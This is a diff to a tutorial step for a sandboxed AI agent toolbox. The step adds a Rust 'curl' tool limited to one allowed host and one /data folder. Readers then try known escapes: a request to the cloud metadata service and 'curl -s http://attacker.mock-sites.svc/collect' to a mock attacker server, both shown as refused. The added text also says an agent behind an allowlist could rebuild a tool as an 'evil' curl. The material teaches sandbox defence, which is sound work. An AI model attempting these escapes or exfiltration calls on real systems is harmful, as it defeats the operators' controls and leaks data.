@@ -2,22 +2,22 @@
 
 **Folder:** `steps/02-curl`
 
-This `curl` is a small stand-in written in Rust, and a
-component like any other. Its code decides how it reaches the
-network: through the host's HTTP client, with no sockets of its own. Which
-hosts it may reach isn't in its code. It is the `allowedHosts` line in the
-manifest, which this step sets to one host.
+Now let's give our agent `curl`, or rather, a small `curl` stand-in written in Rust.
+The commands we'll test all work like normal `curl`, and that includes known functionality
+facilitating breakouts that is documented on [GTFOBins](https://gtfobins.github.io/), a
+very fun catalogue of everyday programs that break out of restricted shells.
 
-`curl` is also on [GTFOBins](https://gtfobins.github.io/), the catalogue of
-everyday programs that break out of restricted shells, because it reaches
-places you did not mean it to: the cloud metadata service, other hosts, and
-anywhere on disk with `-o`. Once it is in the agent's workload, you'll try
-each of those.
+In this step, we'll see that those breakouts don't work because the tool component
+doesn't have the grants that would enable them to work. But we'll also illustrate another
+principle: a clever agent working behind a command allowlist could recreate an allowed
+tool like curl, and then use its "evil" `curl` to get up to mischief.
+
+This is the step where we'll do an optional component build, creating our
+`curl` tool in Rust.
 
 Everyone can use the **prebuilt** curl in `artifacts/`, and every command
-below shows that first. If you have Rust, you can **build your own** instead;
-each command then has a second form for your build. Both end with the same
-grant.
+below shows that first. Each command then has a second form for your custom build.
+Both end with the same grant.
 
 ## Build your own (optional)
 
@@ -28,7 +28,7 @@ The `curl` stand-in is pure Rust, so no C toolchain is needed.
 
 To make it yours, open `components/tool-curl/src/lib.rs` and change the
 message `"saved {} bytes to {path}\n"`, for example to
-`"saved {} bytes to {path} (built by me)\n"`. Then build it, which writes
+`"bwahaha saved {} bytes to {path}\n"`. Then build it, which writes
 `target/wasm32-wasip2/release/tool_curl.wasm`:
 
 ```sh
@@ -101,9 +101,9 @@ kubectl apply -f steps/02-curl/workloaddeployment-mine.yaml \
 `kubectl delete workloaddeployment toolbox-agent` and apply again, so the host
 fetches the new push.
 
-The same agent as step 1, with curl added: one component, and its interface
+This is the same agent as step 1, with curl added: one component, and its interface
 listed under `hostInterfaces` so the toolbox plugin offers it to the agent.
-The grant, the same in both manifests: one host, one folder.
+The grant is the same in both manifests: one host, one folder.
 
 ```yaml
 # under hostInterfaces
@@ -117,21 +117,6 @@ The grant, the same in both manifests: one host, one folder.
     allowedHosts: [api.mock-sites.svc]
     volumeMounts: [{ name: curl-data, mountPath: /data }]
 ```
-
-## Who does what
-
-The host enforces both boundaries. It refuses a request to any host not in
-`allowedHosts`, and the component's filesystem holds only the folder mounted
-at `/data`. The tool only words the error messages you'll see:
-
-* For a host, the host returns an `HttpRequestDenied` error, and the tool
-  writes it as `access-denied: <host>: this tool may not reach that host (not
-  in its allowedHosts)`.
-* For a file, the filesystem answers "No such file or directory", because
-  the path doesn't exist in this component's view. The tool reports that as
-  `access-denied` and adds `(this tool sees only /data)`.
-
-The messages are the tool's choice. What gets through is the host's.
 
 ## Ask curl
 
@@ -157,7 +142,7 @@ In Codespaces:
 ```
 <!-- /codespaces -->
 
-The prompt that got "no tool named curl" in step 1. The host is in curl's
+This is the prompt that got "no tool named curl" in step 1. The host is in curl's
 `allowedHosts`, so the mock API answers.
 
 **2. Save a page into the tool's folder** 
@@ -181,7 +166,7 @@ The model turns this into `curl -o page.html`. The prebuilt curl answers
 wrote, which shows your code is the one running. The grant includes `/data`,
 so the write succeeds: the folder is the boundary, not a blanket ban.
 
-## Now try each escape
+## Now try some known escapes
 
 **3. The metadata service is refused** 
 
@@ -203,7 +188,7 @@ On most clouds this address hands out credentials. The host refuses it before an
 
 **4. An attacker's server is refused** 
 
-In the chat (not Codespaces):
+Let's say there's a malicious server out there that wants to collect sensitive data, and your agent is trying to connect to it. In the chat (not Codespaces):
 
 ```chat
 curl -s http://attacker.mock-sites.svc/collect
@@ -297,12 +282,7 @@ In Codespaces:
 The page you saved in item 2 reads back. The tool doesn't check paths itself:
 the filesystem it is given holds only that one folder.
 
-**For hosts, the grant is what stops it.** `make prove` also runs a control
-with `allowedHosts` widened to `*` (`control-wide-open.yaml`), and the same
-request to the attacker's server then goes through (`control-checks.txt`). The tool
-didn't change; only its grant did.
-
-The later steps use the prebuilt curl. To keep your own build, change the
+Note: The steps that follow use the prebuilt curl. To keep your own build, change the
 `curl` image in that step's manifest to `tool-curl:mine`.
 
 Full transcript (prebuilt curl): [`expected-output.txt`](expected-output.txt).
